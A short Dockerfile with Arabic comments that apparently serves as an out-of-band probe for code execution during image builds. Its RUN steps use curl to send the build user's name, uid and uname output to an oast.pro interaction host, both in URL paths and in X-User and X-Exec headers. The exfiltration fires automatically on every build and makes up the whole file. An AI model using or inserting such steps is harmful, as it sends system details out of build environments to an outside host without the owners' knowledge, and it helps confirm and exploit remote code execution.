FROM alpine:latest

# نزل curl
RUN apk add --no-cache curl

# الطريقة الصح (بدون whoami)
RUN curl "http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$(id -un)"

# Header (أنضف وأضمن)
RUN curl -H "X-User: $(id -un)" \
    "http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/header_final"
    
RUN curl -H "X-Exec: user=$(id -un);uid=$(id -u);os=$(uname -a)" \
    "http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/exec_confirm"
